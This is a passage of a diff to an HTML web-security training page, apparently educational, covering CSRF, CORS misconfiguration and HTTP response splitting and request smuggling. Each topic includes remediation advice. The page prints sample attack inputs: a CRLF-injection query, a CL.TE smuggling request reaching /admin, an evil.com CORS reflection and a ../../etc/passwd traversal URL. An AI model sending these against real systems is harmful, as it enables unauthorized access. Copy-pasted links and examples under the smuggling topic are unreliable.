+                    <b>Scenario 2 — CSRF using POST request</b>
+                    <p>1. Attacker creates a hidden form:</p>
+                    <img src="Images/CSRF-2.png"width="100%" height="auto">
+                    <p>2. When a logged-in user visits the page, the form submits automatically.</p>
+                    <p>3. The bank transfers money to the attacker’s account.</p>
+                </div>
+
+                <div class="remediation-box">
+                    <h3>🛠 Remediation (How to Prevent CSRF)</h3>
+                    <b>1. Use Anti-CSRF Tokens</b>
+                    <p>Include a unique token in forms or AJAX requests, tied to the user session.</p>
+                    <p>Server validates token before processing the request.</p>
+                    <p>Example (HTML form):</p>
+                    <img src="Images/CSRF-3.png" width="100%" height="auto">
+                    <p>JavaScript context: use JS string escaping or avoid embedding untrusted data into script blocks.</p>
+                    <p>URL context: percent-encode.</p>
+                    <p><b>2. Use SameSite Cookies</b>Set cookies with SameSite=Lax or SameSite=Strict to prevent them from being sent in cross-site requests.</p>
+                    <p><b>3. Verify Origin/Referer Header</b> Ensure requests come from your own domain before processing sensitive actions.</p>
+                    <p><b>4. Use Framework Protection</b> Most modern frameworks (Django, Rails, Laravel, Spring) have built-in CSRF protection.</p>
+                    <p><b>5. Avoid GET for state-changing actions</b> Only use POST, PUT, DELETE for actions that modify data.</p>
+                </div>
+                                
+                <h3>📚 Reference Links:</h3>
+                <p><a href="https://owasp.org/www-community/attacks/csrf">https://owasp.org/www-community/attacks/csrf</a></p>
+                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</a></p>
+                <p><a href="https://developer.mozilla.org/en-US/docs/Glossary/CSRF">https://developer.mozilla.org/en-US/docs/Glossary/CSRF</a></p>
+                <p><a href="https://portswigger.net/web-security/csrf">https://portswigger.net/web-security/csrf</a></p>
+            </div>
+        </div>
+
+        <!-- Topic 20: Cross-Origin Resource Sharing -->
+            <div id="cross-origin-resource-sharing" class="topic-card">
+                <div class="topic-header">
+                    <div class="topic-icon">
+                        <i class="fas fa-file-upload"></i>
+                    </div>
+                    <h2>20. Cross-Origin Resource Sharing</h2>
+                </div>
+                
+                <h3>🧩 CORS (Cross-Origin Resource Sharing):</h3>
+                <p>CORS (Cross-Origin Resource Sharing) is a browser security mechanism that controls whether a web page running on one origin (domain) can make requests to another origin and read the responses.</p>
+                <p><b>Same-Origin Policy (SOP):</b> by default, scripts can only access responses from the same origin.</p>
+                <p><b>CORS:</b> allows servers to relax SOP by specifying which origins are allowed to access their resources.</p>
+                <p><b>Important:</b> CORS is enforced by browsers only, not by the server. A misconfigured CORS policy can let attackers read sensitive data from your site.</p>
+                
+                <div class="example-box">
+                    <h3>Examples</h3>
+                    <p>You are logged into your bank. Visiting a malicious site could make your browser unknowingly send a money transfer request to your bank.</p>
+
+                <div class="warning-box">
+                    <h3>💥 Impact of the Issue</h3>
+                    <p><b>Steal sensitive data</b> from APIs (user info, emails, tokens).</p>
+                    <p><b>Hijack accounts</b> if authentication cookies are sent automatically.</p>
+                    <p><b>Perform unauthorized actions</b> by tricking logged-in users.</p>
+                    <p><b>Exfiltrate CSRF tokens or session info</b>, enabling further attacks.</p>
+                </div>
+                <p>Severity depends on what the API returns and whether credentials (cookies, tokens) are involved.</p>
+                
+                <div class="attack-scenario-box">
+                    <h3>🧪 Attack Scenarios & Examples</h3>
+                    <b>Scenario 1 — Malicious site steals data</b>
+                    <p>1. Victim is logged in to api.example.com.</p>
+                    <p>2. Victim visits attacker.com</p>
+                    <p>3. Attacker’s JS sends:</p>
+                    <!-- <img src="https://example.com/change-email?email=attacker@evil.com" /> -->
+                    <img src="Images/CORS-1.png" width="100%" height="auto">
+                    <p>If api.example.com allows the attacker’s origin via CORS, the browser sends the cookie and attacker reads the response.</p>                    
+                    <b>Scenario 2 — Origin reflection</b>
+                    <p>Server responds:</p>
+<pre>
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+</pre>
+                    <p>Any attacker origin can bypass SOP and access sensitive data.</p>
+                </div>
+
+                <div class="remediation-box">
+                    <h3>🛠 Remediation (How to fix CORS issues)</h3>
+                    <b>1. Use strict origin whitelist</b>
+                    <p>Only allow trusted origins, e.g., https://app.example.com.</p>
+                    <b>2. Handle credentials safely</b>
+                    <p>If Access-Control-Allow-Credentials: true, never use * for origin.</p>
+                    <p>Prefer token-based auth over cookies where possible.</p>
+                    <b>3. Always validate authorization server-side</b>
+                    <p>Do not rely on CORS to protect sensitive endpoints.</p>
+                    <b>4. Limit methods & headers</b>
+                    <p>Only allow required HTTP methods (GET, POST) and headers.</p>
+                    <b>5. Use Vary: Origin</b>
+                    <p>Ensures caches do not serve wrong ACAO headers.</p>
+                    <b>6. Secure cookies</b>
+                    <p>Use HttpOnly, Secure, and SameSite flags to reduce risk.</p>
+                </div>
+                <h3>✅ Example of Safe CORS (Node.js Express)</h3>
+                <img src="Images/CORS-2.png" width="100%" height="auto">
+                <h3>📚 Reference Links:</h3>
+                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS">https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS</a></p>
+                <p><a href="https://owasp.org/www-project-secure-headers/#access-control-allow-origin">https://owasp.org/www-project-secure-headers/#access-control-allow-origin</a></p>
+                <p><a href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a></p>
+            </div>
+        </div>
+
+           <!-- Topic 21: HTTP Splitting and Smuggling -->
+            <div id="http-splitting-and-smuggling" class="topic-card">
+                <div class="topic-header">
+                    <div class="topic-icon">
+                        <i class="fas fa-file-upload"></i>
+                    </div>
+                    <h2>21. HTTP Splitting and Smuggling</h2>
+                </div>
+                
+                <h3>🌐 HTTP Splitting:</h3>
+                <p>HTTP Splitting and Smuggling vulnerabilities occur when attackers manipulate how web servers, proxies, or load balancers interpret HTTP requests. This can let them inject extra responses, bypass security controls, poison caches, or hijack user sessions. The fix is strict input validation, consistent parsing across components, and secure HTTP header handling.</p>
+                <p><b>Definition:</b> HTTP Response Splitting happens when an attacker injects CRLF characters (\r\n) into HTTP headers.</p>
+                <p><b>Effect:</b> This “splits” one response into two, allowing attackers to inject malicious headers or content.</p>
+                <b>Example:</b>
+<pre>
+GET /page?lang=en%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK
+</pre>
+                <p>This tricks the server into sending two responses, enabling cache poisoning or XSS.</p>
+                <h3>🌐 HTTP Smuggling:</h3>
+                <p><b>Definition:</b> HTTP Request Smuggling exploits inconsistent parsing of HTTP requests between front-end (proxy/load balancer) and back-end servers.</p>
+                <p><b>Effect:</b> Attackers craft requests that are interpreted differently by each server, letting them smuggle hidden requests.</p>
+                <b>Example:</b>
+<pre>
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: victim.com
+</pre>
+                <p>The proxy may see one request, while the back-end sees two, allowing attackers to bypass controls.</p>
+
+                <div class="example-box">
+                    <h3>Examples</h3>
+                    <p>You are logged into your bank. Visiting a malicious site could make your browser unknowingly send a money transfer request to your bank.</p>
+
+                <div class="warning-box">
+                    <h3>💥 Impact of the Issue</h3>
+                    <p><b>Cache Poisoning:</b> Attackers inject malicious responses into shared caches.</p>
+                    <p><b>Session Hijacking:</b> Smuggled requests can steal cookies or tokens.</p>
+                    <p><b>Bypass Security Controls:</b> WAFs or proxies may miss hidden requests.</p>
+                    <p><b>Cross-Site Scripting (XSS):</b> Injected headers or responses can execute malicious scripts.</p>
+                    <p><b>Data Theft & Privilege Escalation:</b> Attackers gain unauthorized access to sensitive endpoints.</p>
+                </div>
+                
+                <div class="attack-scenario-box">
+                    <h3>🎭 Attacker Scenarios & Examples</h3>
+                    <p><b>Cache Poisoning Attack:</b> Attacker injects malicious JavaScript into a cached response, served to all users.</p>
+                    <p><b>Hidden Admin Access:</b> Smuggled request bypasses authentication checks and reaches /admin.</p>
+                    <p><b>Session Fixation:</b> Injected headers force a victim to use a known session ID.</p>
+                    <p><b>Real-World Example:</b> In 2019, multiple CDNs and load balancers were found vulnerable to HTTP request smuggling, allowing attackers to hijack sessions and poison caches.</p>
+                </div>
+
+                <div class="remediation-box">
+                    <h3>🛠 Remediation Strategies</h3>
+                    <p><b>Input Validation:</b> Sanitize user input to block CRLF injection.</p>
+                    <p><b>Consistent Parsing:</b> Ensure all servers (proxy, load balancer, back-end) use the same HTTP parsing rules.</p>
+                    <p><b>Disable Ambiguous Headers:</b> Avoid using both Content-Length and Transfer-Encoding together.</p>
+                    <p><b>Patch & Update:</b> Keep web servers, proxies, and frameworks updated.</p>
+                    <p><b>Security Testing:</b> Use penetration testing tools to detect splitting/smuggling flaws.</p>
+                    <p><b>WAF Rules:</b> Deploy rules to block suspicious HTTP header manipulations.</p>
+                </div>
+
+                <h3>📚 Reference Links:</h3>
+                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS">https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS</a></p>
+                <p><a href="https://owasp.org/www-project-secure-headers/#access-control-allow-origin">https://owasp.org/www-project-secure-headers/#access-control-allow-origin</a></p>
+                <p><a href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a></p>
+            </div>
+        </div>
+
+    <!-- Topic 21: Security Headers -->
             <div id="security-headers" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-heading"></i>
                     </div>
-                    <h2>15. Security headers for Web application</h2>
+                    <h2>21. Security Headers</h2>
                 </div>
                 
                 <h3>📌Content Security Policy (CSP):</h3><p>It is a security feature that helps prevent Cross-Site Scripting (XSS), clickjacking, and other code injection attacks by controlling which resources (scripts, styles, images, etc.) the browser is allowed to load and execute.</p>
@@ -1890,7 +2121,7 @@ http://example.com/getFile?name=../../etc/passwd
                 </div>
                 
                 <div class="warning-box">
-                    <h3>⚠️ What is the Impact if CSP is Not Implemented?</h3>
+                    <h3>⚠️ Impact if CSP is Not Implemented?</h3>
                     <p>Without CSP:</p>
                     <p>Your app is vulnerable to XSS attacks, where malicious scripts can run in the browser.</p>
                     <p>Attackers may steal cookies, session tokens, or impersonate users.</p>
@@ -1899,7 +2130,7 @@ http://example.com/getFile?name=../../etc/passwd
                 </div>
                 
                 <div class="remediation-box">
-                    <h3>🛠️ Remediation of the Issue</h3>
+                    <h3>🛠️ Remediation</h3>
                     <p>1. Implement a strong CSP policy.</p>
                     <p>2. Avoid inline JavaScript and use external scripts with nonce or hash.</p>
                     <p>3. Remove unsafe directives like unsafe-inline, unsafe-eval.</p>
